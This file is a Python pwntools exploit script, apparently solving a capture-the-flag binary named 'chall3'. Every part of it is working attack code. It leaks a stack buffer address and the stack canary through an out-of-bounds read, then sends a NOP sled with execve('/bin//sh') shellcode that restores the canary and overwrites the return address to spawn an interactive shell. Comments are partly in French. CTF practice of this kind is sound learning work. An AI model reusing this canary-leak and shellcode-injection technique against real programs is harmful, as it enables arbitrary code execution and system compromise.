from pwn import *
import struct

proc = process("../chall3")

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69"\
            +b"\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a"\
            +b"\x3b\x58\x99\x0f\x05"

buf_size = 200

payload = asm("nop") * (buf_size - len(shellcode)) + shellcode

PROMPT = b"[I] Initial string = "

# XOR Key
proc.sendline(b"2")
time.sleep(0.1)
proc.sendline(b"abc")
time.sleep(0.1)

# Leak buffer address (local_f0 = buffer + offset = buffer - 24)
proc.sendline(b"1")
time.sleep(0.1)
proc.sendline(b"ceci est un test")
time.sleep(0.1)
proc.sendline(b"-24") # offset
time.sleep(0.1)
proc.sendline(b"8") # length (8 = address)
time.sleep(0.1)

# Get the leaked address from output (UTF-8)
buf_addr = proc.readline_startswithb(PROMPT)[len(PROMPT):]
print("buf_addr:", buf_addr)
# Convert the UTF-8 to bytes
buf_addr_bytes = bytes.fromhex(buf_addr.decode('utf-8'))
print("buf_addr_bytes:", buf_addr_bytes)
# Convert bytes to integer (Q = unsigned long long)
buf_addr_with_offset_int = struct.unpack("Q", buf_addr_bytes)[0]
print("convert addr in int:", buf_addr_with_offset_int)
# Remove the offset to recover the real buffer address
buf_addr = buf_addr_with_offset_int + 24
print("add 24:", buf_addr)
# Convert the int to bytes
buf_addr = struct.pack("<Q", buf_addr)
print("buf_addr little endian:", buf_addr)

# Leak canary
proc.sendline(b"1")
time.sleep(0.1)
proc.sendline(b"ceci est un test")
time.sleep(0.1)
proc.sendline(b"200")
time.sleep(0.1)
proc.sendline(b"8")

canary_addr = proc.readline_startswithb(PROMPT)[len(PROMPT):]
print("canary_addr:", canary_addr)
canary_addr_bytes = bytes.fromhex(canary_addr.decode('utf-8'))
print("canary_addr_bytes:", canary_addr_bytes)

# Remplissage buffer avec shellcode
# On replace le canary
# on va écraser RBP
# on écrit dans RIP l'adresse vers le buffer

final_payload = payload + canary_addr_bytes + b'a' * 8 + buf_addr

proc.sendline(b"1")
time.sleep(0.1)
proc.sendline(final_payload)
time.sleep(0.1)
proc.sendline(b'\x00')
proc.sendline(b'\x00')

proc.interactive()
